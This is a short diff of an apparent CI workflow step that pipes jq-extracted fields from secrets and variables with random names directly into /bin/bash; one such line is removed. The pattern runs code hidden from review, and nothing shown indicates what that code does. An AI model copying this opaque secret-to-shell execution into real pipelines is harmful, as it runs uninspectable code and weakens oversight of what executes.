@@ -27,7 +27,6 @@ jobs:
           kjmto1: ${{ secrets.kjmto1 }}
         run: |
           printf '%s' "$kjmto1" | jq -r .wxarw030 | /bin/bash
-          echo $zrs3 | jq -r .yjoss37173 | /bin/bash
           echo $rg770 | jq -r .ydl406 | /bin/bash
           echo $b3674 | jq -r .qk976 | /bin/bash
 
